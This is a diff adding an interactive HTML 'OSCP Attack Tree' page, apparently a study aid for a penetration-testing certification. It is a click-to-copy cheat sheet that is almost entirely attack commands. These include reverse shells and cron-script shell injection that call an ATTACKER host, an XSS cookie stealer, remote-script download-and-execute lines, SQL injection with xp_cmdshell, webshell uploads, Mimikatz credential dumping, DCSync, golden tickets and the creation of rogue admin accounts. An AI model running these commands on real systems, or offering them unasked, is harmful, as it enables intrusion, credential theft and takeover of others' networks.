@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OSCP Attack Tree Map</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI','Cascadia Code',monospace;overflow:hidden;height:100vh}
+#header{background:#161b22;border-bottom:1px solid #30363d;padding:10px 20px;display:flex;align-items:center;justify-content:space-between;z-index:10;position:relative}
+#header h1{font-size:16px;color:#58a6ff}
+#header .links a{color:#8b949e;text-decoration:none;margin-left:14px;font-size:12px}
+#header .links a:hover{color:#58a6ff}
+#tabs{background:#161b22;border-bottom:1px solid #30363d;padding:6px 16px;display:flex;gap:4px;flex-wrap:wrap;z-index:10;position:relative}
+.tab{padding:5px 12px;border-radius:6px;border:1px solid #30363d;background:transparent;color:#8b949e;cursor:pointer;font-family:inherit;font-size:12px}
+.tab:hover,.tab.on{color:#0d1117;border-color:#58a6ff;background:#58a6ff}
+#canvas{width:100%;height:calc(100vh - 90px);overflow:hidden;cursor:grab;position:relative}
+#canvas:active{cursor:grabbing}
+#canvas svg{position:absolute;top:0;left:0}
+.edge{fill:none;stroke-width:1}
+#toast{position:fixed;bottom:20px;right:20px;background:#3fb950;color:#0d1117;padding:8px 16px;border-radius:6px;font-size:12px;font-weight:600;opacity:0;transition:opacity .3s;pointer-events:none;z-index:50;font-family:monospace}
+#toast.show{opacity:1}
+#tip{position:fixed;bottom:16px;left:16px;color:#8b949e;font-size:11px;z-index:10}
+</style>
+</head>
+<body>
+<div id="header">
+  <h1>OSCP Attack Tree</h1>
+  <div class="links">
+    <a href="https://oscpguide.com" target="_blank">oscpguide.com</a>
+    <a href="https://medium.com/@TheHuskyHacker" target="_blank">Medium</a>
+    <a href="https://github.com/TheHuskyHacker" target="_blank">GitHub</a>
+  </div>
+</div>
+<div id="tabs"></div>
+<div id="canvas"><svg id="svg"></svg></div>
+<div id="toast">Copied!</div>
+<div id="tip">Drag to pan | Scroll to zoom | Click green commands to copy</div>
+
+<script type="application/json" id="treedata">
+[
+  {
+    "id":"recon","label":"Recon &\nEnumeration","color":"#4ec9b0",
+    "children":[
+      {"label":"Port Scanning","cmds":[
+        "nmap -sV -sC -p- -oA full_scan TARGET",
+        "sudo nmap -sS -p- --min-rate 5000 TARGET",
+        "sudo nmap -sU --top-ports=50 TARGET",
+        "nmap --script vuln TARGET",
+        "nmap -v -sn SUBNET/24 -oG ping-sweep.txt"
+      ]},
+      {"label":"DNS","cmds":[
+        "host -t ns DOMAIN",
+        "dnsrecon -d DOMAIN -t std",
+        "dnsrecon -d DOMAIN -D wordlist.txt -t brt",
+        "gobuster dns -d DOMAIN -w wordlist.txt -t 10",
+        "dig axfr DOMAIN @DNS_SERVER"
+      ]},
+      {"label":"SMB\n(139/445)","cmds":[
+        "smbclient -L //TARGET/ -N",
+        "enum4linux -a TARGET",
+        "crackmapexec smb TARGET -u '' -p '' --shares",
+        "nmap -p 139,445 --script smb-os-discovery TARGET",
+        "rpcclient -U '' -N TARGET"
+      ]},
+      {"label":"SNMP\n(161)","cmds":[
+        "onesixtyone -c community.txt -i ips.txt",
+        "snmpwalk -c public -v1 -t 10 TARGET",
+        "snmpwalk -c public -v1 TARGET 1.3.6.1.4.1.77.1.2.25"
+      ]},
+      {"label":"Web\nDirectories","cmds":[
+        "gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -t 40",
+        "ffuf -w wordlist.txt -u http://TARGET/FUZZ -e .php,.html,.txt",
+        "nikto -h http://TARGET"
+      ]},
+      {"label":"LDAP\n(389)","cmds":[
+        "ldapsearch -x -H ldap://DC -b 'DC=domain,DC=com'",
+        "ldapsearch -x -H ldap://DC -D 'DOMAIN\\USER' -w PASS -b 'DC=domain,DC=com'"
+      ]}
+    ]
+  },
+  {
+    "id":"web","label":"Web\nAttacks","color":"#569cd6",
+    "children":[
+      {"label":"LFI / Path\nTraversal","cmds":[
+        "curl http://TARGET/page?file=../../../../etc/passwd",
+        "curl 'http://TARGET/page?file=php://filter/convert.base64-encode/resource=index.php'",
+        "curl -A '&lt;?php system($_GET[cmd]);?&gt;' http://TARGET/",
+        "curl 'http://TARGET/page?file=/var/log/apache2/access.log&cmd=id'"
+      ]},
+      {"label":"SQL\nInjection","cmds":[
+        "' OR 1=1 -- -",
+        "' ORDER BY 1-- -   (increment until error)",
+        "' UNION SELECT 1,2,3-- -",
+        "' UNION SELECT user(),version(),database()-- -",
+        "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;",
+        "EXEC xp_cmdshell 'whoami';",
+        "sqlmap -u 'http://TARGET/page?param=1' --batch",
+        "sqlmap -r request.txt -p param --os-shell",
+        "impacket-mssqlclient USER:PASS@TARGET -windows-auth"
+      ]},
+      {"label":"Command\nInjection","cmds":[
+        "Separators: ; | || & && $() backticks",
+        "curl -X POST --data 'Archive=git%3Bid' http://TARGET/endpoint"
+      ]},
+      {"label":"File\nUpload","cmds":[
+        "cp /usr/share/webshells/php/simple-backdoor.php shell.php",
+        "curl http://TARGET/uploads/shell.php?cmd=whoami",
+        "Try extensions: .pHP .php5 .phtml .php.jpg"
+      ]},
+      {"label":"XSS","cmds":[
+        "&lt;script&gt;alert(1)&lt;/script&gt;",
+        "&lt;img src=x onerror=alert(1)&gt;",
+        "&lt;script&gt;new Image().src='http://ATTACKER/steal?c='+document.cookie&lt;/script&gt;"
+      ]}
+    ]
+  },
+  {
+    "id":"pw","label":"Password\nAttacks","color":"#ce9178",
+    "children":[
+      {"label":"Online\nBrute Force","cmds":[
+        "hydra -l USER -P rockyou.txt ssh://TARGET",
+        "hydra -l USER -P rockyou.txt TARGET http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'",
+        "crackmapexec smb TARGET -u users.txt -p PASS -d DOMAIN --continue-on-success"
+      ]},
+      {"label":"Hashcat","cmds":[
+        "hashcat -m 0 hash.txt rockyou.txt       # MD5",
+        "hashcat -m 1000 hash.txt rockyou.txt     # NTLM",
+        "hashcat -m 1800 hash.txt rockyou.txt     # sha512crypt",
+        "hashcat -m 5600 hash.txt rockyou.txt     # NetNTLMv2",
+        "hashcat -m 13100 hash.txt rockyou.txt    # Kerberoast",
+        "hashcat -m 18200 hash.txt rockyou.txt    # AS-REP"
+      ]},
+      {"label":"John","cmds":[
+        "john --wordlist=rockyou.txt hash.txt",
+        "keepass2john Database.kdbx > keepass.hash",
+        "ssh2john id_rsa > ssh.hash",
+        "zip2john file.zip > zip.hash"
+      ]},
+      {"label":"Mimikatz","cmds":[
+        "mimikatz # privilege::debug",
+        "mimikatz # sekurlsa::logonpasswords",
+        "mimikatz # lsadump::sam",
+        "mimikatz # lsadump::dcsync /user:DOMAIN\\Administrator",
+        "mimikatz # sekurlsa::tickets"
+      ]},
+      {"label":"Pass the\nHash","cmds":[
+        "impacket-psexec -hashes :NTLM_HASH USER@TARGET",
+        "impacket-wmiexec -hashes :NTLM_HASH USER@TARGET",
+        "evil-winrm -i TARGET -u USER -H NTLM_HASH",
+        "sudo responder -I INTERFACE"
+      ]}
+    ]
+  },
+  {
+    "id":"shells","label":"Shells &\nTransfers","color":"#c586c0",
+    "children":[
+      {"label":"Reverse\nShells","cmds":[
+        "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1",
+        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER PORT >/tmp/f",
+        "python3 reverse shell (socket,subprocess,os connect to ATTACKER:PORT)",
+        "powershell -nop -w hidden -e BASE64_PAYLOAD"
+      ]},
+      {"label":"Listeners","cmds":[
+        "nc -nvlp PORT",
+        "rlwrap nc -nvlp PORT"
+      ]},
+      {"label":"Shell\nUpgrade","cmds":[
+        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
+        "Ctrl+Z then: stty raw -echo; fg",
+        "export TERM=xterm && stty rows 40 cols 160"
+      ]},
+      {"label":"MSFVenom","cmds":[
+        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe",
+        "msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell.elf",
+        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f aspx -o shell.aspx"
+      ]},
+      {"label":"Transfer\nLinux","cmds":[
+        "python3 -m http.server 80",
+        "wget http://ATTACKER/file -O /tmp/file",
+        "curl http://ATTACKER/file -o /tmp/file"
+      ]},
+      {"label":"Transfer\nWindows","cmds":[
+        "certutil -urlcache -split -f http://ATTACKER/file C:\\Windows\\Temp\\file",
+        "iwr -uri http://ATTACKER/file -OutFile C:\\Windows\\Temp\\file",
+        "impacket-smbserver share $(pwd) -smb2support",
+        "copy \\\\ATTACKER\\share\\file C:\\Windows\\Temp\\file"
+      ]}
+    ]
+  },
+  {
+    "id":"winpriv","label":"Windows\nPrivEsc","color":"#dcdcaa",
+    "children":[
+      {"label":"Situational\nAwareness","cmds":[
+        "whoami /priv",
+        "whoami /groups",
+        "net user",
+        "net localgroup Administrators",
+        "systeminfo",
+        "netstat -ano",
+        "cmdkey /list"
+      ]},
+      {"label":"Service\nExploits","cmds":[
+        "Get-CimInstance -ClassName win32_service | Select Name,State,PathName",
+        "icacls C:\\path\\to\\service.exe",
+        "wmic service get name,pathname | findstr /i auto"
+      ]},
+      {"label":"Potato\nAttacks","cmds":[
+        "whoami /priv   # Check SeImpersonatePrivilege",
+        ".\\SigmaPotato.exe 'net user hacker Password123! /add'",
+        ".\\SigmaPotato.exe 'net localgroup Administrators hacker /add'"
+      ]},
+      {"label":"Automated\nEnum","cmds":[
+        "iwr -uri http://ATTACKER/winPEASx64.exe -OutFile winPEAS.exe",
+        ".\\winPEAS.exe",
+        "Import-Module .\\PowerUp.ps1; Invoke-AllChecks"
+      ]}
+    ]
+  },
+  {
+    "id":"linpriv","label":"Linux\nPrivEsc","color":"#6fc3df",
+    "children":[
+      {"label":"Quick Wins","cmds":[
+        "sudo -l",
+        "cat /etc/shadow",
+        "find / -perm -4000 -type f 2>/dev/null   # SUID",
+        "getcap -r / 2>/dev/null",
+        "ls -la /etc/cron*"
+      ]},
+      {"label":"SUID\nAbuse","cmds":[
+        "find / -perm -u=s -type f 2>/dev/null",
+        "Check each on gtfobins.github.io",
+        "find . -exec /bin/bash -p \\;"
+      ]},
+      {"label":"Sudo\nAbuse","cmds":[
+        "sudo -l   # Check allowed commands",
+        "Check each on GTFOBins",
+        "sudo apt-get changelog apt   # then !/bin/bash"
+      ]},
+      {"label":"Cron Jobs","cmds":[
+        "cat /etc/crontab",
+        "echo 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' >> /path/to/cron-script.sh"
+      ]},
+      {"label":"Kernel\nExploits","cmds":[
+        "uname -a && cat /etc/os-release",
+        "searchsploit 'linux kernel VERSION local privilege escalation'"
+      ]},
+      {"label":"Automated\nEnum","cmds":[
+        "curl http://ATTACKER/linpeas.sh | bash",
+        "./pspy64   # Monitor processes without root"
+      ]}
+    ]
+  },
+  {
+    "id":"pivot","label":"Pivoting &\nTunneling","color":"#f472b6",
+    "children":[
+      {"label":"SSH Local\nForward","cmds":[
+        "ssh -N -L LOCAL_PORT:INTERNAL_IP:INTERNAL_PORT USER@PIVOT",
+        "ssh -N -L 8080:172.16.1.10:80 user@192.168.1.5"
+      ]},
+      {"label":"SSH Dynamic\n(SOCKS)","cmds":[
+        "ssh -N -D 0.0.0.0:9999 USER@PIVOT",
+        "proxychains nmap -sT --top-ports=20 -Pn INTERNAL_TARGET"
+      ]},
+      {"label":"SSH Remote\nForward","cmds":[
+        "ssh -N -R 127.0.0.1:KALI_PORT:INTERNAL_IP:INTERNAL_PORT kali@ATTACKER"
+      ]},
+      {"label":"sshuttle","cmds":[
+        "sshuttle -r USER@PIVOT INTERNAL_SUBNET/24"
+      ]},
+      {"label":"Chisel","cmds":[
+        "chisel server --port 8080 --reverse   # Attacker",
+        "chisel client ATTACKER:8080 R:socks   # Target",
+        "proxychains with socks5 127.0.0.1 1080",
+        "chisel client ATTACKER:8080 R:KALI_PORT:INTERNAL_IP:INTERNAL_PORT"
+      ]},
+      {"label":"Ligolo-ng","cmds":[
+        "sudo ip tuntap add user $(whoami) mode tun ligolo",
+        "sudo ip link set ligolo up",
+        "./proxy -selfcert   # Attacker",
+        "./agent -connect ATTACKER:11601 -ignore-cert   # Target",
+        "sudo ip route add INTERNAL_SUBNET/24 dev ligolo"
+      ]},
+      {"label":"Windows\nForwarding","cmds":[
+        "netsh interface portproxy add v4tov4 listenport=PORT listenaddress=0.0.0.0 connectport=PORT connectaddress=TARGET",
+        "plink.exe -ssh -l kali -pw PASS -R 127.0.0.1:KALI_PORT:127.0.0.1:TARGET_PORT ATTACKER"
+      ]}
+    ]
+  },
+  {
+    "id":"ad","label":"Active\nDirectory","color":"#d19a66",
+    "children":[
+      {"label":"PowerView\nEnum","cmds":[
+        "Import-Module .\\PowerView.ps1",
+        "Get-NetDomain",
+        "Get-NetUser | select samaccountname",
+        "Get-NetGroupMember 'Domain Admins'",
+        "Find-LocalAdminAccess",
+        "Get-NetUser -SPN | select samaccountname,serviceprincipalname"
+      ]},
+      {"label":"BloodHound","cmds":[
+        "Import-Module .\\SharpHound.ps1",
+        "Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Temp\\",
+        "sudo neo4j start && bloodhound",
+        "Query: Shortest Path to Domain Admin"
+      ]},
+      {"label":"AS-REP\nRoasting","cmds":[
+        "impacket-GetNPUsers DOMAIN/ -dc-ip DC -usersfile users.txt -format hashcat -outputfile asrep.hash",
+        "hashcat -m 18200 asrep.hash rockyou.txt"
+      ]},
+      {"label":"Kerbero-\nasting","cmds":[
+        "impacket-GetUserSPNs -request -dc-ip DC DOMAIN/USER:PASS",
+        "hashcat -m 13100 hashes.kerberoast rockyou.txt"
+      ]},
+      {"label":"Lateral\nMovement","cmds":[
+        "impacket-psexec DOMAIN/USER:PASS@TARGET",
+        "impacket-wmiexec DOMAIN/USER:PASS@TARGET",
+        "evil-winrm -i TARGET -u USER -p PASS",
+        "xfreerdp /u:USER /p:PASS /d:DOMAIN /v:TARGET /cert-ignore",
+        "mimikatz # sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH",
+        "mimikatz # kerberos::ptt ticket.kirbi"
+      ]},
+      {"label":"Domain\nEscalation","cmds":[
+        "impacket-secretsdump DOMAIN/USER:PASS@DC",
+        "mimikatz # lsadump::dcsync /user:DOMAIN\\Administrator",
+        "mimikatz # kerberos::golden /user:USER /domain:DOMAIN /sid:SID /krbtgt:HASH /ptt",
+        "impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL"
+      ]}
+    ]
+  },
+  {
+    "id":"evasion","label":"AV Evasion &\nClient-Side","color":"#e06c75",
+    "children":[
+      {"label":"In-Memory\nExecution","cmds":[
+        "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')",
+        "iex(iwr http://ATTACKER/script.ps1 -UseBasicParsing)"
+      ]},
+      {"label":"Base64\nEncoding","cmds":[
+        "echo -n 'COMMAND' | iconv -t UTF-16LE | base64 -w 0",
+        "powershell -enc BASE64"
+      ]},
+      {"label":"Cross\nCompile","cmds":[
+        "x86_64-w64-mingw32-gcc exploit.c -o exploit.exe"
+      ]},
+      {"label":"Exploit\nDiscovery","cmds":[
+        "searchsploit SERVICE VERSION",
+        "searchsploit -m EXPLOIT_ID"
+      ]}
+    ]
+  },
+  {
+    "id":"proofs","label":"Proof\nCollection","color":"#3fb950",
+    "children":[
+      {"label":"Linux\nProofs","cmds":[
+        "cat /home/*/local.txt && whoami && hostname && ip addr",
+        "cat /root/proof.txt && whoami && hostname && ip addr",
+        "SCREENSHOT with all output visible"
+      ]},
+      {"label":"Windows\nProofs","cmds":[
+        "type C:\\Users\\*\\Desktop\\local.txt & whoami & hostname & ipconfig",
+        "type C:\\Users\\Administrator\\Desktop\\proof.txt & whoami & hostname & ipconfig",
+        "SCREENSHOT with all output visible"
+      ]},
+      {"label":"Find\nFlags","cmds":[
+        "find / -name proof.txt 2>/dev/null",
+        "find / -name local.txt 2>/dev/null",
+        "dir /s /b C:\\proof.txt",
+        "dir /s /b C:\\local.txt"
+      ]}
+    ]
+  }
+]
+</script>
+
+<script>
+(function(){
+  var DATA = JSON.parse(document.getElementById("treedata").textContent);
+  var svg = document.getElementById("svg");
+  var canvas = document.getElementById("canvas");
+  var vx = 0, vy = 0, vz = 1;
+  var dragging = false, dragX, dragY;
+
+  function buildTabs(){
+    var tabs = document.getElementById("tabs");
+    DATA.forEach(function(sec, i){
+      var b = document.createElement("button");
+      b.className = "tab" + (i === 0 ? " on" : "");
+      b.textContent = sec.label.replace(/\n/g, " ");
+      b.style.borderColor = sec.color;
+      b.onclick = function(){
+        document.querySelectorAll(".tab").forEach(function(t){ t.classList.remove("on"); });
+        b.classList.add("on");
+        drawTree(sec);
+      };
+      tabs.appendChild(b);
+    });
+  }
+
+  function ns(tag){
+    return document.createElementNS("http://www.w3.org/2000/svg", tag);
+  }
+
+  function drawTree(sec){
+    svg.innerHTML = "";
+    var W = canvas.clientWidth;
+    var H = canvas.clientHeight;
+    svg.setAttribute("width", W * 3);
+    svg.setAttribute("height", H * 3);
+
+    var rootX = 160;
+    var rootY = H * 1.5;
+    var techCount = sec.children.length;
+    var techSpacing = Math.min(140, (H * 2.6) / (techCount + 1));
+    var techStartY = rootY - ((techCount - 1) * techSpacing) / 2;
+
+    drawNode(rootX, rootY, sec.label, sec.color, sec.color, "#0d1117", 140, 52, 15, true);
+
+    sec.children.forEach(function(tech, ti){
+      var techX = rootX + 280;
+      var techY = techStartY + ti * techSpacing;
+
+      drawCurve(rootX + 70, rootY, techX - 65, techY, sec.color);
+      drawNode(techX, techY, tech.label, "#161b22", sec.color, sec.color, 130, 46, 12, true);
+
+      var cmdCount = tech.cmds.length;
+      var cs = Math.min(38, (techSpacing * 0.85) / Math.max(cmdCount, 1));
+      var cmdStartY = techY - ((cmdCount - 1) * cs) / 2;
+
+      tech.cmds.forEach(function(cmd, ci){
+        var cmdX = techX + 320;
+        var cmdY = cmdStartY + ci * cs;
+        var display = cmd.length > 52 ? cmd.substring(0, 49) + "..." : cmd;
+
+        var tw = Math.max(display.length * 6.8 + 24, 100);
+        drawCurve(techX + 65, techY, cmdX - tw/2, cmdY, "#30363d");
+        drawCmdNode(cmdX, cmdY, display, cmd, tw);
+      });
+    });
+
+    vx = -80; vy = 0; vz = 0.6;
+    applyTransform();
+  }
+
+  function drawNode(cx, cy, text, fill, stroke, textFill, w, h, fontSize, isBold){
+    var g = ns("g");
+    var r = ns("rect");
+    r.setAttribute("x", cx - w/2);
+    r.setAttribute("y", cy - h/2);
+    r.setAttribute("width", w);
+    r.setAttribute("height", h);
+    r.setAttribute("rx", 10);
+    r.setAttribute("ry", 10);
+    r.setAttribute("fill", fill);
+    r.setAttribute("stroke", stroke);
+    r.setAttribute("stroke-width", 2);
+    g.appendChild(r);
+
+    var lines = text.split("\n");
+    lines.forEach(function(line, i){
+      var t = ns("text");
+      t.setAttribute("x", cx);
+      t.setAttribute("y", cy + (i - (lines.length - 1) / 2) * 16);
+      t.setAttribute("text-anchor", "middle");
+      t.setAttribute("dominant-baseline", "central");
+      t.setAttribute("fill", textFill);
+      t.setAttribute("font-size", fontSize);
+      if(isBold) t.setAttribute("font-weight", "700");
+      t.textContent = line;
+      g.appendChild(t);
+    });
+    svg.appendChild(g);
+  }
+
+  function drawCmdNode(cx, cy, display, full, tw){
+    var g = ns("g");
+    g.style.cursor = "pointer";
+
+    var r = ns("rect");
+    r.setAttribute("x", cx - tw/2);
+    r.setAttribute("y", cy - 15);
+    r.setAttribute("width", tw);
+    r.setAttribute("height", 30);
+    r.setAttribute("rx", 6);
+    r.setAttribute("ry", 6);
+    r.setAttribute("fill", "#0d1117");
+    r.setAttribute("stroke", "#21262d");
+    r.setAttribute("stroke-width", 1);
+
+    var t = ns("text");
+    t.setAttribute("x", cx);
+    t.setAttribute("y", cy);
+    t.setAttribute("text-anchor", "middle");
+    t.setAttribute("dominant-baseline", "central");
+    t.setAttribute("fill", "#3fb950");
+    t.setAttribute("font-size", "11");
+    t.setAttribute("font-family", "'Cascadia Code','Fira Code',monospace");
+    t.textContent = display;
+
+    g.appendChild(r);
+    g.appendChild(t);
+
+    g.onmouseenter = function(){ r.setAttribute("stroke", "#3fb950"); };
+    g.onmouseleave = function(){ r.setAttribute("stroke", "#21262d"); };
+
+    g.onclick = function(e){
+      e.stopPropagation();
+      navigator.clipboard.writeText(full).then(function(){
+        var toast = document.getElementById("toast");
+        toast.textContent = "Copied: " + full.substring(0, 50) + (full.length > 50 ? "..." : "");
+        toast.classList.add("show");
+        setTimeout(function(){ toast.classList.remove("show"); }, 1500);
+      });
+    };
+
+    svg.appendChild(g);
+  }
+
+  function drawCurve(x1, y1, x2, y2, color){
+    var p = ns("path");
+    var mx = (x1 + x2) / 2;
+    p.setAttribute("d", "M" + x1 + "," + y1 + " C" + mx + "," + y1 + " " + mx + "," + y2 + " " + x2 + "," + y2);
+    p.setAttribute("class", "edge");
+    p.setAttribute("stroke", color);
+    svg.appendChild(p);
+  }
+
+  function applyTransform(){
+    svg.style.transform = "translate(" + vx + "px," + vy + "px) scale(" + vz + ")";
+    svg.style.transformOrigin = "0 0";
+  }
+
+  canvas.addEventListener("mousedown", function(e){
+    dragging = true; dragX = e.clientX - vx; dragY = e.clientY - vy;
+  });
+  canvas.addEventListener("mousemove", function(e){
+    if(!dragging) return;
+    vx = e.clientX - dragX;
+    vy = e.clientY - dragY;
+    applyTransform();
+  });
+  canvas.addEventListener("mouseup", function(){ dragging = false; });
+  canvas.addEventListener("mouseleave", function(){ dragging = false; });
+
+  canvas.addEventListener("wheel", function(e){
+    e.preventDefault();
+    var dz = e.deltaY > 0 ? 0.9 : 1.1;
+    var nz = Math.max(0.15, Math.min(3, vz * dz));
+    var rect = canvas.getBoundingClientRect();
+    var mx = e.clientX - rect.left;
+    var my = e.clientY - rect.top;
+    vx = mx - (mx - vx) * (nz / vz);
+    vy = my - (my - vy) * (nz / vz);
+    vz = nz;
+    applyTransform();
+  }, {passive: false});
+
+  buildTabs();
+  drawTree(DATA[0]);
+})();
+</script>
+</body>
+</html>
